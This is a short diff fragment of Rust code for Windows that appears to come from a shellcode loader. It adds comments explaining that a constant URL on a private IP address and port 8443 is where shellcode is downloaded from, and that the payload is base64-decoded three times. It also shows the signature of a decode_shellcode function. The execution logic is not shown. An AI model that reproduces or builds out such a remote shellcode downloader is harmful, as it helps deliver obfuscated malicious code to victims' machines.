@@ -27,8 +27,9 @@ use windows::{
 };
 
 
+/// The URL where shellcode will be downloaded from
 const URL: &str = "http://192.168.1.114:8443/note.txt";
-// const SHELLCODE_LEN: usize = 200262;
+/// The # of base64 iterations to decode
 const B64_ITERATIONS: usize = 3;
 
 fn decode_shellcode(sc: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
